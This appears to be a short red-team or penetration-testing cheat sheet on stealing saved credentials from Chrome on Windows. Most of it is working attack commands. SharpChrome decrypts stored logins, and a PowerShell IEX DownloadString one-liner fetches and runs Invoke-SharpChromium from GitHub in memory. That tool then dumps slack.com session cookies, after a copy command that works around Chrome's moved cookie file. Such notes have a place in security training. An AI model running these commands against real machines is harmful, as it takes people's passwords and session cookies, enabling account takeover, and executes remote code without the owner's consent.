# Retrieving Saved Credentials from Chrome windows

* Users often store credentials in their browsers for applications that they frequently visit.
  * We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell-session
.\SharpChrome.exe logins /unprotect
```

### Extract Cookies

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

```powershell-session
Invoke-SharpChromium -Command "cookies slack.com"
```

* We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.

```powershell-session
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

```powershell-session
Invoke-SharpChromium -Command "cookies slack.com"
```
